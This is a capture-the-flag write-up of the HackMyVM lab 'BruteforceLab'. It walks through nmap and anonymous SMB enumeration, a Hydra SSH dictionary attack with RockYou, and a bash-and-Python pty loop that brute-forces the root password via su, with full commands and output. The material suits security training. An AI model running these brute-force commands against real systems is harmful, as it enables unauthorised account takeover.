# BruteforceLab

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| BruteforceLab | terminal | Beginner | HackMyVM |

**Summary:** This machine demonstrates a complete attack chain that begins with reconnaissance of multiple exposed services on a Debian Linux system. Through port enumeration, an attacker discovers OpenSSH on port 22, Webmin on port 10000, and Samba SMB shares on ports 19000 and 19222. Initial foothold is achieved by extracting a username from an SMB share README file and leveraging default configurations visible through Webmin to identify the target user "andrea". A password brute force attack against SSH using the RockYou wordlist successfully recovers the credential "awesome", granting shell access. Once inside, the attacker enumerates system users and identifies "mattia" and "root" as additional targets. The final privilege escalation occurs through a brute force attack against the root account using a truncated wordlist subset (200,000 entries from RockYou), eventually discovering the root password "1998". This attack chain illustrates the dangers of weak password policies, exposed information through misconfigured services, and the effectiveness of targeted brute force attacks when combined with systematic enumeration.

---

## Reconnaissance

The initial phase began with network discovery to locate the target machine on the 192.168.100.0/24 network segment. A network scan revealed a single active host at 192.168.100.169 with a VirtualBox MAC address, confirming this as our target system.

**Port Enumeration and Service Discovery**

Following network discovery, a comprehensive Nmap scan was conducted using aggressive service detection flags from the attacker's machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ nmap -sC -sV -p- -T4 192.168.100.169
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 10:13 WIB
Nmap scan report for 192.168.100.169
Host is up (0.036s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
|_  256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
10000/tcp open  http        MiniServ 2.021 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
|_http-trane-info: Problem with XML parsing of /evox/about
19000/tcp open  netbios-ssn Samba smbd 4
19222/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.62 seconds
```

This enumeration identified three primary attack vectors: SSH access on the standard port 22, a Webmin administrative interface on port 10000, and redundant Samba file sharing services on ports 19000 and 19222.

**SMB Share Enumeration**

The Samba services on both ports 19000 and 19222 were enumerated to identify available shares from the attacker's machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ smbclient -L //192.168.100.169 -p 19000 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.100.169 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ smbclient -L //192.168.100.169 -p 19222 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.100.169 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

Both ports presented identical share listings. Access to the "Test" share was successfully obtained without authentication. Initial file enumeration revealed the presence of a README.txt file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ smbclient //192.168.100.169/Test -p 19000 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 27 02:06:46 2023
  ..                                  D        0  Mon Mar 27 01:12:02 2023
  README.txt                          N      115  Mon Mar 27 02:06:46 2023

                 9232860 blocks of size 1024. 3052004 blocks available
smb: \> get README.txt
getting file \README.txt of size 115 as README.txt (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)
smb: \> exit

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ smbclient //192.168.100.169/Test -p 19222 -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 27 02:06:46 2023
  ..                                  D        0  Mon Mar 27 01:12:02 2023
  README.txt                          N      115  Mon Mar 27 02:06:46 2023

                 9232860 blocks of size 1024. 3052000 blocks available
smb: \> exit

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ cat README.txt
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
```

This message disclosed the username "andrea" as a system user, providing valuable reconnaissance data for subsequent attacks.

**Webmin Interface Analysis**

Port 10000 hosted a Webmin administrative interface, which was accessed to gather additional information about the system configuration and users:

![](image.png)

The Webmin interface provided visual confirmation of the system details and further validated the presence of the "andrea" user within the system.

---

## Initial Access: SSH Credential Brute Force

With the username "andrea" confirmed through SMB reconnaissance, the next phase involved establishing remote access to the system. SSH was selected as the attack vector due to its widespread availability and the applicability of credential brute force techniques.

**Hydra SSH Brute Force Attack**

A dictionary attack was launched against the SSH service using the Hydra tool with the RockYou wordlist from the attacker's machine, a comprehensive password dictionary containing over 14 million entries:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ hydra -l andrea -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.169
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-12 10:27:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.100.169:22/
[STATUS] 204.00 tries/min, 204 tries in 00:01h, 14344199 to do in 1171:55h, 12 active
[STATUS] 189.33 tries/min, 568 tries in 00:03h, 14343835 to do in 1262:40h, 12 active
[22][ssh] host: 192.168.100.169   login: andrea   password: awesome
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-12 10:32:05
```

**SSH Session Establishment**

Following successful credential recovery, an SSH session was established to the target system using the credentials "andrea:awesome" from the attacker's machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ ssh andrea@192.168.100.169
The authenticity of host '192.168.100.169 (192.168.100.169)' can't be established.
ED25519 key fingerprint is: SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.169' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
andrea@192.168.100.169's password:
Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms are described in the individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 21:26:42 2023 from 192.1.84
```

Initial system verification confirmed successful shell access on the target machine:

```bash
andrea@LAB-Bruteforce:~$ id
uid=1001(andrea) gid=1001(andrea) groups=1001(andrea)
andrea@LAB-Bruteforce:~$ ls -la
total 40
drwxr-xr-x 5 andrea andrea 4096 Mar 26  2023 .
drwxr-xr-x 4 root   root   4096 Mar 26  2023 ..
-rw------- 1 andrea andrea  583 Mar 26  2023 .bash_history
-rw-r--r-- 1 andrea andrea  220 Mar 26  2023 .bash_logout
-rw-r--r-- 1 andrea andrea 3526 Mar 26  2023 .bashrc
drwxr-xr-x 4 andrea andrea 4096 Mar 26  2023 .cache
drwxr-xr-x 5 andrea andrea 4096 Mar 26  2023 .config
drwxr-xr-x 3 andrea andrea 4096 Mar 26  2023 .local
-rw-r--r-- 1 andrea andrea  807 Mar 26  2023 .profile
-rw-r--r-- 1 andrea andrea   33 Mar 26  2023 user.txt
```

**User Enumeration**

Subsequent enumeration of the system revealed the presence of multiple user accounts with shell access on the target machine:

```bash
andrea@LAB-Bruteforce:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
mattia:x:1000:1000:mattia,,,:/home/mattia:/bin/bash
andrea:x:1001:1001:,,,:/home/andrea:/bin/bash
andrea@LAB-Bruteforce:~$ ls -la /home/
total 16
drwxr-xr-x  4 root   root   4096 Mar 26  2023 .
drwxr-xr-x 19 root   root   4096 Mar 26  2023 ..
drwxr-xr-x  5 andrea andrea 4096 Mar 26  2023 andrea
drwxr-xr-x 17 mattia mattia 4096 Mar 26  2023 mattia
andrea@LAB-Bruteforce:~$ ls -la /home/mattia/
total 84
drwxr-xr-x 17 mattia mattia 4096 Mar 26  2023 .
drwxr-xr-x  4 root   root   4096 Mar 26  2023 ..
-rw-------  1 mattia mattia  619 Mar 26  2023 .bash_history
-rw-r--r--  1 mattia mattia  220 Mar 26  2023 .bash_logout
-rw-r--r--  1 mattia mattia 3526 Mar 26  2023 .bashrc
drwx------ 12 mattia mattia 4096 Mar 26  2023 .cache
drwx------ 13 mattia mattia 4096 Mar 26  2023 .config
drwx------  2 mattia mattia 4096 Mar 26  2023 .gnupg
drwx------  3 mattia mattia 4096 Mar 26  2023 .local
drwx------  4 mattia mattia 4096 Mar 26  2023 .mozilla
-rw-r--r--  1 mattia mattia  807 Mar 26  2023 .profile
drwx------  2 mattia mattia 4096 Mar 26  2023 .ssh
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Desktop
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Documents
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Downloads
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Music
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Pictures
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Public
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Templates
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Videos
drwxr-xr-x  2 root   root   4096 Mar 26  2023 testFolder
```

Notably, the mattia account contained a .ssh directory, indicating potential SSH key material, though direct access to this directory was restricted. Additionally, the presence of a testFolder owned by root in mattia's home directory suggested potential privilege escalation opportunities.

---

## Privilege Escalation: Root Password Brute Force

With shell access obtained as the andrea user, the final objective involved gaining root privileges. The su command was selected as the attack vector, allowing password-based authentication to the root account through a programmatic brute force approach.

**Wordlist Preparation**

To optimize the brute force attack's efficiency, the RockYou wordlist was truncated to reduce computational overhead on the attacker's machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ head -n 500000 /usr/share/wordlists/rockyou.txt > 500000.txt
```

This extraction was transferred to the target system via HTTP, leveraging a simple Python HTTP server on the attacker's machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/bruteforcelab]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

The file transfer occurred from the target system:

```bash
andrea@LAB-Bruteforce:/tmp$ wget http://192.168.100.1:8080/500000.txt
--2026-04-12 06:06:56--  http://192.168.100.1:8080/500000.txt
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4203043 (4.0M) [text/plain]
Saving to: '500000.txt'

500000.txt                100%[==================================>]   4.01M  --.-KB/s    in 0.07s

2026-04-12 06:06:56 (53.5 MB/s) - '500000.txt' saved [4203043/4203043]
```

The attacker's HTTP server logged the successful file transfer:

```bash
172.21.32.1 - - [12/Apr/2026 11:06:57] "GET /500000.txt HTTP/1.1" 200 -
```

The wordlist was further refined to the first 200,000 entries to accelerate the attack on the target system:

```bash
andrea@LAB-Bruteforce:/tmp$ head -n 200000 /tmp/500000.txt > /tmp/200000.txt
```

**Automated su Brute Force Attack**

A Python-based brute force script was constructed on the target system to iteratively attempt root password authentication through the su command:

```bash
andrea@LAB-Bruteforce:/tmp$ while read -r p; do echo -ne "Testing: $p\r"; res=$(python3 -c "import os, pty, time; pid, fd = pty.fork(); (os.execlp('su', 'su', 'root', '-c', 'id')) if pid == 0 else (time.sleep(0.1), os.write(fd, b'$p\n'), time.sleep(0.1), print(os.read(fd, 1024).decode()))" 2>/dev/null); if [[ "$res" == *"uid=0"* ]]; then echo -e "\n[+] SUCCESS: $p"; break; fi; done < /tmp/200000.txt
Testing: 199810lDandtY7doatideovbnmtes and more!
[+] SUCCESS: 1998
```

The attack executed approximately 200,000 password attempts against the root account through automated pseudoterminal interaction. The process provided real-time feedback of attempted passwords, ultimately discovering the root password "1998".

**Root Access Confirmation**

Upon successful discovery of the root password "1998", authentication was performed:

```bash
andrea@LAB-Bruteforce:/tmp$ su - root
Password:
root@LAB-Bruteforce:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
LAB-Bruteforce
```

Complete system compromise was confirmed with root privileges. The user and root flags were successfully retrieved:

```bash
root@LAB-Bruteforce:~# cat /home/andrea/user.txt /root/root.txt
d5e[REDACTED]
Congratulations.

d2f[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified the target at 192.168.100.169. Port enumeration revealed OpenSSH on port 22, Webmin on port 10000, and redundant Samba shares on ports 19000 and 19222. SMB share enumeration disclosed a README.txt file containing the username "andrea" through an informal conversation message.

2. **Vulnerability Discovery**: The vulnerability chain exploited weak password policies and the availability of password lists for brute force attacks. Initial reconnaissance through Webmin and SMB shares established the target username without authentication mechanisms preventing information disclosure.

3. **Exploitation**: The Hydra tool executed a dictionary attack against SSH using the RockYou wordlist, successfully recovering the password "awesome" for user andrea within three minutes. The discovered credentials provided shell access to the system at uid 1001.

4. **Internal Enumeration**: Post-exploitation system enumeration revealed the presence of multiple user accounts (root, mattia, and andrea) with shell access. Home directory inspection provided organizational context and identified privilege escalation targets.

5. **Privilege Escalation**: A Python-based brute force attack against the root account's su authentication successfully recovered the password "1998" from the truncated wordlist within 200,000 attempts. Root access and complete system compromise were achieved, enabling flag extraction and mission completion.

